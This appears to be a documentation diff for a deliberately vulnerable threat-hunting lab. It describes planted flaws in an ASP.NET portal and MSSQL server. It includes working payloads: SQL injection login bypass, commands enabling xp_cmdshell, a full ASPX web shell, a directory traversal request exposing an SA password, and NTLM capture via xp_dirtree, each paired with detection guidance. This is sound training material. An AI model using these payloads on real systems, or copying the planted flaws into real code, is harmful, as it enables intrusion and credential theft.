@@ -659,14 +659,242 @@ SSH as any user (no sudo)
 
 ---
 
+## Web Application
+
+The ThruntOps internal web portal runs on **WEB** (10.2.50.14) via IIS + ASP.NET 4.5. The application contains three intentional vulnerability classes. Source lives in the `thruntops-web` GitLab project at `http://10.2.50.15`.
+
+Entry point: `webdev` → GitLab maintainer on `thruntops-web` → CI/CD deploys `.aspx` files to WEB wwwroot via SMB.
+
+---
+
+### SQL Injection — Login Bypass and RCE via xp_cmdshell (WEB)
+
+| Field | Detail |
+|---|---|
+| **Host** | WEB (10.2.50.14) |
+| **Entry point** | `Login.aspx` — unauthenticated |
+| **Condition** | Username field is concatenated directly into a SQL `WHERE` clause; connection string uses SA account with `xp_cmdshell` available |
+| **Primitive** | Classic string-based SQLi → authentication bypass → stacked queries → `xp_cmdshell` → OS command execution as MSSQL service account |
+| **MITRE ATT&CK** | [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/), [T1059.003 — Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) |
+
+**Exploit:**
+
+```
+# Authentication bypass — Login.aspx username field
+' OR '1'='1' --
+
+# Stacked query — enable xp_cmdshell (if not already enabled)
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+
+# OS command execution
+'; EXEC xp_cmdshell 'whoami'; --
+```
+
+**Attack path:**
+
+```
+Login.aspx — POST username=' OR '1'='1' --
+  → Authentication bypass → authenticated session
+  → Stacked query: enable xp_cmdshell (T1059.003)
+  → xp_cmdshell 'powershell -c <reverse shell>' → shell as MSSQL service account
+```
+
+**Detection opportunities:**
+
+- SQL error messages or anomalous query patterns in IIS logs (single-quote characters, `--` comments, EXEC keywords)
+- `sp_configure` or `xp_cmdshell` executed via application service account (SQL Server audit, Event ID 18456 / 33205)
+- `cmd.exe` or `powershell.exe` spawned by `sqlservr.exe` (Sysmon Event ID 1)
+
+---
+
+### Arbitrary File Upload — Web Shell (WEB)
+
+| Field | Detail |
+|---|---|
+| **Host** | WEB (10.2.50.14) |
+| **Entry point** | `Upload.aspx` — authenticated (bypass login first or use valid credentials) |
+| **Condition** | No file extension validation; files written to `uploads/` under wwwroot with original filename; IIS configured to execute `.aspx` files in `uploads/` |
+| **Primitive** | Upload a `.aspx` web shell → browse to `http://10.2.50.14/uploads/<shell>.aspx` → arbitrary OS command execution as IIS application pool identity |
+| **MITRE ATT&CK** | [T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) |
+
+**Exploit:**
+
+```aspx
+<%@ Page Language="C#" %>
+<% System.Diagnostics.Process p = new System.Diagnostics.Process();
+   p.StartInfo.FileName = "cmd.exe";
+   p.StartInfo.Arguments = "/c " + Request["cmd"];
+   p.StartInfo.UseShellExecute = false;
+   p.StartInfo.RedirectStandardOutput = true;
+   p.Start();
+   Response.Write(p.StandardOutput.ReadToEnd()); %>
+```
+
+Upload `shell.aspx`, then:
+
+```
+http://10.2.50.14/uploads/shell.aspx?cmd=whoami
+```
+
+**Attack path:**
+
+```
+POST /Upload.aspx — multipart file: shell.aspx (ASPX web shell)
+  → File saved to C:\inetpub\wwwroot\uploads\shell.aspx
+  → GET /uploads/shell.aspx?cmd=powershell+-c+<payload>
+  → RCE as IIS AppPool\DefaultAppPool (T1505.003)
+```
+
+**Detection opportunities:**
+
+- New `.aspx` file created under `uploads/` (Sysmon Event ID 11 — file create, path matches `*\uploads\*.aspx`)
+- `w3wp.exe` spawning `cmd.exe` or `powershell.exe` (Sysmon Event ID 1, parent image `w3wp.exe`)
+- HTTP 200 response to a previously non-existent `.aspx` path under `uploads/` (IIS access log)
+
+---
+
+### Directory Traversal — web.config / Credential Disclosure (WEB)
+
+| Field | Detail |
+|---|---|
+| **Host** | WEB (10.2.50.14) |
+| **Entry point** | `View.aspx?file=` — authenticated |
+| **Condition** | `file` parameter is appended to a base path (`~/documents/`) via `Server.MapPath` without sanitization — `../` sequences are not stripped |
+| **Primitive** | Traverse out of `documents/` to read `web.config` — which contains the SA password in the connection string |
+| **MITRE ATT&CK** | [T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/), [T1552.001 — Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
+
+**Exploit:**
+
+```
+GET /View.aspx?file=../web.config
+```
+
+**web.config** contains:
+
+```xml
+<add name="ThruntOps"
+     connectionString="Server=localhost;Database=ThruntOps;User Id=sa;Password=Sa@ThruntOps2024!;"
+     providerName="System.Data.SqlClient" />
+```
+
+**Attack path:**
+
+```
+GET /View.aspx?file=../web.config
+  → Server.MapPath("~/documents/") + "../web.config"
+  → Reads C:\inetpub\wwwroot\web.config
+  → SA password disclosed: Sa@ThruntOps2024!
+  → sqlcmd -S 10.2.50.14 -U sa -P 'Sa@ThruntOps2024!' -Q "EXEC xp_cmdshell 'whoami'"
+```
+
+**Detection opportunities:**
+
+- `../` in query string parameters (IIS URL scan rule / WAF pattern)
+- `web.config` read by `w3wp.exe` from a path that includes parent directory traversal (Sysmon Event ID 15 — file stream access, or audit object access)
+- Direct `sqlcmd` connection to MSSQL from unexpected source IP (SQL Server audit / network connection logs)
+
+---
+
+## MSSQL
+
+MSSQL Server 2019 runs on **WEB** (10.2.50.14). Mixed-mode authentication is enabled; SA account is active with a known password (`Sa@ThruntOps2024!` — leaked via directory traversal). The `thruntops\DBA` group has sysadmin rights.
+
+---
+
+### xp_cmdshell — OS Command Execution via SQL (WEB)
+
+| Field | Detail |
+|---|---|
+| **Host** | WEB (10.2.50.14) |
+| **Entry point** | SA credentials (leaked via traversal) or `thruntops\DBA` group member |
+| **Condition** | SA account is sysadmin; `xp_cmdshell` can be enabled via `sp_configure` |
+| **Primitive** | SA or sysadmin executes OS commands as the MSSQL service account (`NT SERVICE\MSSQLSERVER`) |
+| **MITRE ATT&CK** | [T1059.003 — Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) |
+
+**Exploit:**
+
+```sql
+-- Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+-- Execute OS command
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -nop -w hidden -c "<reverse shell>"';
+```
+
+**Detection opportunities:**
+
+- `sp_configure 'xp_cmdshell'` execution (SQL Server audit — Event Class: Object:Altered)
+- `sqlservr.exe` spawning `cmd.exe` or `powershell.exe` (Sysmon Event ID 1)
+- `xp_cmdshell` in SQL batch text (SQL Server trace / Extended Events)
+
+---
+
+### NTLM Hash Capture via xp_dirtree (WEB)
+
+| Field | Detail |
+|---|---|
+| **Host** | WEB (10.2.50.14) |
+| **Entry point** | SA credentials or sysadmin-equivalent account |
+| **Condition** | `xp_dirtree` or `xp_fileexist` initiates an SMB connection to an attacker-controlled host — MSSQL service account sends an NTLM authentication challenge |
+| **Primitive** | Capture `NT SERVICE\MSSQLSERVER` NTLM hash → crack offline → or relay to another service |
+| **MITRE ATT&CK** | [T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/) |
+
+**Exploit:**
+
+```bash
+# 1. Start Responder on Kali
+responder -I eth0 -wPv
+
+# 2. Trigger NTLM auth from MSSQL
+EXEC xp_dirtree '\\10.2.50.250\share'
+```
+
+**Detection opportunities:**
+
+- `xp_dirtree` or `xp_fileexist` with UNC path to non-domain host (SQL Server audit)
+- Outbound SMB connection from WEB to attacker IP (network traffic, port 445)
+- Responder / NTLM capture signatures in network logs
+
+---
+
+### DBA Group → Sysadmin Escalation (WEB)
+
+| Field | Detail |
+|---|---|
+| **Host** | WEB (10.2.50.14) |
+| **Entry point** | `primary_user07` (DBA group member, thruntops.domain) |
+| **Condition** | `thruntops\DBA` AD group is mapped to the `sysadmin` server role in MSSQL |
+| **Primitive** | Domain user in DBA group has full sysadmin rights on MSSQL — can enable xp_cmdshell, read all databases, impersonate any login |
+| **MITRE ATT&CK** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
+
+**Attack path:**
+
+```
+Compromise primary_user07 credentials
+  → Connect to MSSQL: sqlcmd -S 10.2.50.14 -E (Windows auth via RDP or WinRM)
+  → SELECT IS_SRVROLEMEMBER('sysadmin')  → 1
+  → Enable xp_cmdshell → OS command execution as MSSQL service account
+```
+
+**Detection opportunities:**
+
+- Unexpected Windows auth MSSQL login from non-service account (SQL Server audit)
+- `IS_SRVROLEMEMBER('sysadmin')` or role enumeration queries
+- `sp_configure` / `xp_cmdshell` activity from DBA account
+
+---
+
 ## By Technology
 
 | Technology | Vectors |
 |---|---|
 | Active Directory (dual domain) | Credential reuse, Kerberoasting, AS-REP roasting, ACL abuse, lateral movement, trust abuse |
 | ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
-| IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
-| GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
+| IIS + ASP.NET | SQL injection (auth bypass + xp_cmdshell), arbitrary file upload (web shell), directory traversal (credential disclosure) |
+| MSSQL | xp_cmdshell (OS execution), xp_dirtree (NTLM capture), DBA group → sysadmin escalation |
+| GitLab CE | Source code exposure, CI/CD pipeline poisoning, hardcoded secrets in .gitlab-ci.yml, SUID privesc |
 | Linux — gitlab | SUID binary abuse (R, apt-get, less, rsync), capabilities (gzip/CAP_DAC_OVERRIDE), reverse shells |
 | Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch), capabilities (gdb/CAP_SETUID), reverse shells |
 | Windows — all domain VMs | Reverse shells (PowerShell, mshta.exe, certutil, cscript, wscript) |
